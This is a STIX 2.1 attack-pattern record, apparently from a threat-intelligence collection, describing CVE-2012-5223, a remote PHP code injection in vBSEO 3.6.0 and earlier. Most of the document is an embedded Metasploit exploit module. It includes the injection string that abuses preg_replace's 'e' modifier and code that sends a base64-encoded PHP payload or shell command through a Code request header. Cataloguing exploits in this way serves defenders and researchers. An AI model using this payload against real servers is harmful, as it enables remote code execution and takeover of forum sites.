{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6123364d-3793-44ec-b708-75d955c4c7a2",
    "created": "2024-08-14T17:10:05.620855Z",
    "modified": "2024-08-14T17:10:05.62086Z",
    "name": "vBSEO proc_deutf() Remote PHP Code Injection",
    "description": " This module exploits a vulnerability in the 'proc_deutf()' function defined in /includes/functions_vbseocp_abstract.php for vBSEO versions 3.6.0 and earlier. User input passed through 'char_repl' POST parameter isn't properly sanitized before being used in a call to preg_replace() function which uses the 'e' modifier. This can be exploited to inject and execute arbitrary code leveraging the PHP's complex curly syntax. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vbseo_proc_deutf.rb",
            "external_id": "vbseo_proc_deutf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5223"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'vBSEO proc_deutf() Remote PHP Code Injection',\n      'Description'    => %q{\n        This module exploits a vulnerability in the 'proc_deutf()' function\n        defined in /includes/functions_vbseocp_abstract.php for vBSEO versions\n        3.6.0 and earlier. User input passed through 'char_repl' POST parameter\n        isn't properly sanitized before being used in a call to preg_replace()\n        function which uses the 'e' modifier. This can be exploited to inject\n        and execute arbitrary code leveraging the PHP's complex curly syntax.\n      },\n      'Author'         => 'EgiX <n0b0d13s[at]gmail.com>', # originally reported by the vendor\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2012-5223'],\n          ['OSVDB', '78508'],\n          ['BID', '51647'],\n          ['EDB', '18424']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 8190,\n          'Keys'        => ['php'],\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2012-01-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The full URI path to vBulletin\", \"/vb/\"]),\n        OptString.new('CMD', [false, \"Command to execute\"])\n      ])\n  end\n\n  def check\n    flag = rand_text_alpha(rand(10)+10)\n    data = \"char_repl='{${print(#{flag})}}'=>\"\n\n    uri = normalize_uri(datastore['URI'], 'vbseocp.php')\n\n    response = send_request_cgi({\n      'method' => \"POST\",\n      'uri'    => uri,\n      'data'   => data\n    })\n\n    if response.code == 200 and response.body =~ /#{flag}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if datastore['CMD']\n      p = \"passthru(\\\"%s\\\");\" % datastore['CMD']\n      p = Rex::Text.encode_base64(p)\n    else\n      p = Rex::Text.encode_base64(payload.encoded)\n    end\n\n    data = \"char_repl='{${eval(base64_decode($_SERVER[HTTP_CODE]))}}.{${die()}}'=>\"\n\n    uri = normalize_uri(datastore['URI'], 'vbseocp.php')\n\n    response = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'data' => data,\n      'headers' => { 'Code' => p }\n    })\n\n    vprint_status(\"Server replied with #{response ? response.code : \"nothing\"}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-23",
    "x_mitre_platforms": [
        "['php']"
    ]
}